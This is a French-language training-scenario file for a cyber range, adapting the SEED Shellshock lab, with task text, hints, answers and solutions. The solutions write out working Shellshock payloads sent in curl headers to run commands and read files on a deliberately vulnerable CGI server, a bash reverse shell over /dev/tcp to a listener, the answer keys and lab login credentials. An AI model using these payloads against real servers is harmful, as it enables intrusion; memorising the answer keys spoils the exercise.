@@ -1,0 +1,196 @@
+{
+  "title": "SEED Lab - Shellshock Attack",
+  "description": "Adaptation CyberRangeCZ du SEED Lab « Shellshock Attack » : exploiter la vulnérabilité Shellshock de bash via un CGI Apache pour exécuter des commandes à distance, puis obtenir un reverse shell. Une VM, serveur victime en conteneur, flags uniques par étudiant pour les tâches d'exploitation.",
+  "prerequisites": [
+    "Bases de la ligne de commande Linux",
+    "Notions de HTTP et d'en-têtes de requête",
+    "Notions de variables d'environnement"
+  ],
+  "outcomes": [
+    "Expliquer la vulnérabilité Shellshock (fonction dans une variable d'environnement).",
+    "Identifier comment des données de requête HTTP atteignent l'environnement d'un CGI.",
+    "Exécuter une commande à distance via un CGI bash vulnérable.",
+    "Obtenir un reverse shell et comprendre son fonctionnement.",
+    "Citer les défenses : correctif de bash, éviter les CGI en shell."
+  ],
+  "state": "UNRELEASED",
+  "show_stepper_bar": true,
+  "estimated_duration": 66,
+  "variant_sandboxes": true,
+  "levels": [
+    {
+      "title": "Introduction",
+      "level_type": "INFO_LEVEL",
+      "order": 0,
+      "estimated_duration": 5,
+      "minimal_possible_solve_time": null,
+      "content": "# SEED Lab — Shellshock Attack\n\nEn septembre 2014, une faille grave a été découverte dans **bash** : *Shellshock* (CVE-2014-6271). Quand bash importe une **variable d'environnement** dont la valeur définit une fonction, il exécute aussi ce qui suit la définition. Un serveur web qui lance un programme **CGI** en bash place des données de la requête HTTP dans des variables d'environnement : un attaquant peut donc y glisser une commande, que le serveur exécutera.\n\nDans ce TP, la victime est un serveur Apache avec un CGI exécuté par un bash **volontairement vulnérable** (`bash_shellshock`). Vous êtes l'attaquant, depuis la VM.\n\n| Élément | Adresse |\n|-|-|\n| Serveur victime | `www.seedlab-shellshock.com` (conteneur 10.9.0.80) |\n| Vous (attaquant) | la VM, passerelle du réseau du conteneur : **10.9.0.1** |\n\n**Notions :** Shellshock, variables d'environnement, définition de fonction en bash, Apache et CGI."
+    },
+    {
+      "title": "Accès à la sandbox",
+      "level_type": "ACCESS_LEVEL",
+      "order": 1,
+      "estimated_duration": 3,
+      "minimal_possible_solve_time": null,
+      "passkey": "start",
+      "cloud_content": "Soumettez **`start`** une fois connecté.\n\n### Machine : `seed`\n1. Topologie à droite → clic droit sur **`seed`** → **`Open GUI`** (ou SSH).\n2. Connectez-vous avec **`seed`** / **`dees`**.\n3. Lisez le guide : `cat ~/lab/README.txt`\n\nOutils déjà en place : `curl`, `nc`, et le serveur victime déjà démarré. Testez :\n```\ncurl http://www.seedlab-shellshock.com/cgi-bin/vul.cgi\n```\nVous devez voir « Hello World ».",
+      "local_content": "Ce scénario n'a pas été testé en sandbox locale. Utilisez la sandbox cloud."
+    },
+    {
+      "title": "Tâche 1 : un bash vulnérable",
+      "level_type": "TRAINING_LEVEL",
+      "order": 2,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": null,
+      "answer": "bash_shellshock",
+      "answer_variable_name": null,
+      "content": "Le bash d'Ubuntu est corrigé ; le conteneur contient en plus un bash vulnérable, `bash_shellshock` (dans `/bin`, aussi fourni dans le Labsetup). Le test classique définit une fonction via une variable d'environnement, suivie d'une commande : sur un bash vulnérable, la commande s'exécute.\n\nMenez l'expérience sur **les deux** programmes et comparez (énoncé, tâche 1).\n\n**Sur quel programme la commande qui suit la définition de fonction s'exécute-t-elle ? Répondez par le nom du programme.**",
+      "solution": "Test (dans le conteneur, ou avec le binaire du Labsetup) :\n```\nenv x='() { :; }; echo COMMANDE-EXECUTEE' bash_shellshock -c 'echo hello'\n# -> affiche COMMANDE-EXECUTEE puis hello  => vulnérable\nenv x='() { :; }; echo COMMANDE-EXECUTEE' bash -c 'echo hello'\n# -> n'affiche PAS COMMANDE-EXECUTEE       => corrigé\n```\nRéponse : **bash_shellshock**.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "La forme du test",
+          "content": "Une variable d'environnement dont la valeur commence par `() { :; };` définit une fonction ; ce qui suit le `;` est la charge. Sur un bash vulnérable, elle est exécutée au démarrage du shell.",
+          "hint_penalty": 5,
+          "order": 0
+        },
+        {
+          "title": "Comparer",
+          "content": "Lancez exactement le même test avec `bash` (corrigé) et `bash_shellshock` (vulnérable). Seul le second exécute la commande ajoutée.",
+          "hint_penalty": 5,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 20,
+      "attachments": [],
+      "max_score": 20,
+      "variant_answers": false,
+      "reference_solution": [],
+      "mitre_techniques": [],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Tâche 2 : injecter via les variables d'environnement",
+      "level_type": "TRAINING_LEVEL",
+      "order": 3,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": null,
+      "answer": "-A -e -H",
+      "answer_variable_name": null,
+      "content": "Pour atteindre le bash du CGI, vos données doivent arriver dans une **variable d'environnement** du serveur. Le CGI `getenv.cgi` affiche toutes ses variables d'environnement.\n\nAvec `curl`, comparez ce qui apparaît côté serveur selon l'option :\n```\ncurl -v http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi\ncurl -A \"donnee\" http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi\ncurl -e \"donnee\" http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi\ncurl -H \"Test: donnee\" http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi\n```\n**Quelles options de curl permettent d'injecter vos données dans une variable d'environnement du CGI ? Donnez-les dans l'ordre, séparées par une espace (ex. : `-A -e -H`).**",
+      "solution": "- `-A` fixe l'en-tête *User-Agent* → variable `HTTP_USER_AGENT`.\n- `-e` fixe l'en-tête *Referer* → variable `HTTP_REFERER`.\n- `-H` ajoute un en-tête quelconque → variable `HTTP_...`.\n\nCes trois en-têtes se retrouvent dans l'environnement du CGI, donc dans bash. Réponse : **-A -e -H**.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Quel CGI utiliser",
+          "content": "`getenv.cgi` affiche toutes ses variables d'environnement : comparez la sortie selon l'option de curl employée.",
+          "hint_penalty": 10,
+          "order": 0
+        },
+        {
+          "title": "Format de la réponse",
+          "content": "Les trois options concernées, séparées par une espace, dans cet ordre : `-A -e -H`.",
+          "hint_penalty": 5,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 20,
+      "attachments": [],
+      "max_score": 30,
+      "variant_answers": false,
+      "reference_solution": [],
+      "mitre_techniques": [],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Tâche 3 : exécution de commande à distance",
+      "level_type": "TRAINING_LEVEL",
+      "order": 4,
+      "estimated_duration": 20,
+      "minimal_possible_solve_time": null,
+      "answer": null,
+      "answer_variable_name": "flag_task3",
+      "content": "Le CGI `vul.cgi` est exécuté par le bash vulnérable. En plaçant, dans un en-tête HTTP, une définition de fonction suivie d'une commande, vous faites exécuter cette commande par le serveur (énoncé, tâche 3). La sortie vous revient si elle respecte le protocole CGI (une ligne `Content-type: text/plain`, une ligne vide, puis la sortie).\n\n**Objectif.** Un flag propre à votre sandbox est déposé sur le serveur dans\n`/var/seed-flags/task3` : lisible par le serveur, mais **non servi par Apache** et\ninaccessible depuis la VM. Faites lire ce fichier au serveur via la vulnérabilité, et\n**soumettez son contenu**.\n\nEntraînez-vous d'abord (tâche 3.A à 3.D de l'énoncé) : afficher `/etc/passwd`, l'`id` du serveur, créer puis supprimer un fichier dans `/tmp`.",
+      "solution": "On injecte, via un en-tête, une définition de fonction suivie de la commande de lecture :\n```\ncurl -A '() { :; }; echo \"Content-type: text/plain\"; echo; /bin/cat /var/seed-flags/task3' \\\n     http://www.seedlab-shellshock.com/cgi-bin/vul.cgi\n```\nLe serveur exécute `cat` sous l'utilisateur du CGI (`www-data`), qui peut lire le\nfichier, et renvoie le flag. Le `echo; echo` fournit l'en-tête et la ligne vide\nattendus. (Même principe pour `/etc/passwd`, `/bin/id`, etc.)",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "La forme de la charge",
+          "content": "La valeur de l'en-tête doit commencer par `() { :; };` (la définition de fonction), puis votre commande. Utilisez une option qui alimente une variable d'environnement (`-A`, `-e` ou `-H`).",
+          "hint_penalty": 10,
+          "order": 0
+        },
+        {
+          "title": "Récupérer la sortie",
+          "content": "Pour que la réponse vous revienne proprement, votre commande doit d'abord émettre `Content-type: text/plain` puis une ligne vide : `echo \"Content-type: text/plain\"; echo; <commande>`.",
+          "hint_penalty": 15,
+          "order": 1
+        },
+        {
+          "title": "Où est le flag",
+          "content": "Dans `/var/seed-flags/task3`, lisible par `www-data`. Faites exécuter `cat /var/seed-flags/task3` au serveur.",
+          "hint_penalty": 10,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 20,
+      "attachments": [],
+      "max_score": 90,
+      "variant_answers": true,
+      "reference_solution": [],
+      "mitre_techniques": [],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Tâche 4 : reverse shell",
+      "level_type": "TRAINING_LEVEL",
+      "order": 5,
+      "estimated_duration": 15,
+      "minimal_possible_solve_time": null,
+      "answer": null,
+      "answer_variable_name": "flag_task4",
+      "content": "Plutôt qu'une commande unique, un attaquant ouvre souvent un **reverse shell** : le serveur se reconnecte à l'attaquant et lui donne un interpréteur interactif (énoncé, tâche 4 et section 4).\n\n**Objectif.** Obtenez un reverse shell depuis le serveur vers votre VM, puis, dans ce\nshell, lisez le flag de la tâche 4 dans `/var/seed-flags/task4` et **soumettez-le**.\n\nRappel : sur le réseau du conteneur, votre VM (l'attaquant) est en **10.9.0.1**.",
+      "solution": "1. Sur la VM, écoutez :\n```\nnc -nv -l 9090\n```\n2. Déclenchez, via la vulnérabilité, l'ouverture d'un shell qui se redirige vers votre\nécoute (la commande de reverse shell de l'énoncé, vers 10.9.0.1 port 9090) :\n```\ncurl -A '() { :; }; echo; echo; /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1' \\\n     http://www.seedlab-shellshock.com/cgi-bin/vul.cgi\n```\n3. Dans le shell obtenu côté `nc` :\n```\ncat /var/seed-flags/task4\n```\nC'est la réponse.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Écoute côté attaquant",
+          "content": "`nc -nv -l 9090` sur la VM attend la connexion. Laissez ce terminal ouvert.",
+          "hint_penalty": 10,
+          "order": 0
+        },
+        {
+          "title": "Rediriger le shell",
+          "content": "La commande `/bin/bash -i > /dev/tcp/<attaquant>/9090 0<&1 2>&1` redirige entrée/sortie/erreur vers la connexion TCP. L'attaquant est la VM : 10.9.0.1.",
+          "hint_penalty": 15,
+          "order": 1
+        },
+        {
+          "title": "Lire le flag",
+          "content": "Une fois le shell obtenu dans la fenêtre `nc`, tapez `cat /var/seed-flags/task4`.",
+          "hint_penalty": 10,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 20,
+      "attachments": [],
+      "max_score": 60,
+      "variant_answers": true,
+      "reference_solution": [],
+      "mitre_techniques": [],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "Fin",
+      "level_type": "INFO_LEVEL",
+      "order": 6,
+      "estimated_duration": 3,
+      "minimal_possible_solve_time": null,
+      "content": "Bravo. Vous avez exploité Shellshock pour exécuter des commandes à distance, puis obtenu un reverse shell.\n\n**À retenir.** Le problème venait de **bash** (interprétation d'une fonction dans une variable d'environnement), pas du script CGI : tout programme lançant un bash vulnérable avec des données attaquant dans l'environnement était exploitable. **Défenses :** corriger bash (fait depuis 2014), éviter les CGI en shell, et de façon générale ne jamais laisser des données non fiables atteindre un interpréteur. La tâche 5 de l'énoncé le confirme : avec le bash corrigé, l'attaque échoue.\n\nScore total : 200 points = 20/20 (note = points ÷ 10)."
+    }
+  ]
+}
